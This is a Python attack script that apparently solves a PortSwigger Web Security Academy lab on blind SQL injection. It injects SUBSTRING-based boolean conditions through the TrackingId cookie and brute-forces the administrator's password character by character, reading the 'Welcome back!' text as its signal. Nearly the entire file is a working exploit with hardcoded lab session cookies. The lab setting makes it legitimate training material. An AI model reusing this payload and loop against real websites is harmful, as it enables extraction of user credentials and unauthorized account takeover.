import requests
import string
import sys

brute_words = string.ascii_letters + string.digits
#print(brute_words)
hint = "Welcome back!"
req = requests.Session()
url = "https://acb61fb41f12d225c07d8628001700ce.web-security-academy.net"
proxy = dict(https='http://127.0.0.1:8080',http='http://127.0.0.1:8080')

#cookies = dict(Cookie: TrackingId=AAYH77ZP66KLn2s6' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) > 'e; session=kcHvtb2Yl7E5VH2mJGV4r2pFRpOB6rJ6)

password = ""
index = 1
while True:
	for i in brute_words:
		sys.stdout.write(f"\r[+] Password: {password}{i}")
		payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {index}, 1) = '{i}"
		#payload = f"' AND (SELECT SUBSTRING(password,{index},1) FROM users WHERE username='administrator')='{i}"
		#"' AND (SELECT SUBSTRING(password,{index},1) FROM users WHERE username='administrator')='{i}"
		#print(payload)
		post_cookies = dict(TrackingId=f'JUByS3qv4Bh3ukJs{payload}',session='A6DYswM4DwdypAQH92TnnJRPCskhHm8Y')
		#post_cookies = dict(TrackingId='AAYH77ZP66KLn2s6',session='kcHvtb2Yl7E5VH2mJGV4r2pFRpOB6rJ6')
		#print(post_cookies)

		#post_data = dict(csrf='zbyXrXf7k33bf97Oe4D7vbGdk3wdXQsH', username='admin', password='admin')

		#r = requests.post(url ,data = post_data, cookies= post_cookies, proxies=proxy,verify=False)
		#r = requests.post(url ,data = post_data, cookies= post_cookies)
		#r = requests.get(url , cookies= post_cookies,proxies=proxy,verify=False)
		r = requests.get(url , cookies= post_cookies)
		#print(r.text)

		if hint in r.text:
			print(f"Password is: {i}")
			password += i
			index += 1
			


#print(r.text)
